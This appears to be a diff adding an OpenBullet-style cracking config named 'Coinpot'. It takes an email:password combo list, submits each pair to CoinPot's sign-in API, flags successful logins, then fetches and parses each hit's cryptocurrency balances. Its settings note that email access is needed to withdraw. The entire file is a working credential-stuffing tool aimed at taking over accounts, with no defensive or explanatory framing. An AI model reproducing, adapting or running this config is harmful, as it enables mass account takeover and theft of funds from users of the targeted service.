@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Coinpot",
+  "SuggestedBots": 30,
+  "LastModified": "2018-06-05T12:28:53.2513872+00:00",
+  "AdditionalInfo": "Email-Access is required to withdraw.",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "http://coinpot.co/api/security/service.svc/SignIn" AutoRedirect=TRUE 
+  CONTENT "{\"request\":{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"twoFactorAuthCode\":\"\"}}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Sign in was successful " 
+  KEYCHAIN Failure OR 
+    KEY "Invalid sign in credentials " 
+REQUEST POST "http://coinpot.co/api/transactions/service.svc/GetDashboardSummary" AutoRedirect=TRUE 
+  CONTENT "{\"request\":{\"bitcoinCoreBalance\":0,\"dogecoinBalance\":0,\"litecoinBalance\":0,\"ethereumBalance\":0,\"dashBalance\":0,\"bitcoinCashBalance\":0,\"coinpotTokensBalance\":0,\"latestTransactions\":null}}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "balance\":0.000000000000000000,\"currency\":\"Bitcoin Core\",\"currencyId\":1,\"currencyRef\":\"BTC\",\"minimumDepositAmount\":0.001000000000000000,\"minimumWithdrawalAmount\":0.000100000000000000,\"transactionCount\":0,\"withdrawableBalance\":0.000000000000000000},{\"__type\":\"CurrencySummary:#CoinPot.Web.API.Transactions\",\"balance\":0.000000000000000000,\"currency\":\"Dogecoin\",\"currencyId\":2,\"currencyRef\":\"DOGE\",\"minimumDepositAmount\":1.000000000000000000,\"minimumWithdrawalAmount\":50.000000000000000000,\"transactionCount\":0,\"withdrawableBalance\":0.000000000000000000},{\"__type\":\"CurrencySummary:#CoinPot.Web.API.Transactions\",\"balance\":0.000000000000000000,\"currency\":\"Litecoin\",\"currencyId\":3,\"currencyRef\":\"LTC\",\"minimumDepositAmount\":0.010000000000000000,\"minimumWithdrawalAmount\":0.002000000000000000,\"transactionCount\":0,\"withdrawableBalance\":0.000000000000000000},{\"__type\":\"CurrencySummary:#CoinPot.Web.API.Transactions\",\"balance\":0.000000000000000000,\"currency\":\"Dash\",\"currencyId\":5,\"currencyRef\":\"DASH\",\"minimumDepositAmount\":0.020000000000000000,\"minimumWithdrawalAmount\":0.000200000000000000,\"transactionCount\":0,\"withdrawableBalance\":0.000000000000000000},{\"__type\":\"CurrencySummary:#CoinPot.Web.API.Transactions\",\"balance\":0.000000000000000000,\"currency\":\"Bitcoin Cash\",\"currencyId\":6,\"currencyRef\":\"BCH\",\"minimumDepositAmount\":0.001000000000000000,\"minimumWithdrawalAmount\":0.000100000000000000,\"transactionCount\":0,\"withdrawableBalance\":0.000000000000000000" 
+#Doge PARSE "<SOURCE>" REGEX "\"balance\":([^\.]*\..{8})[^,]*,\"currency\":\"[^\\"]*\",\"currencyId\":[^,]*,\"currencyRef\":\"([^\\"]*)" "[1] [2]" Recursive=FALSE -> CAP "Balance" "" "" 
+PARSE "<>" LR "" "" Recursive=FALSE -> CAP "" "" "" 
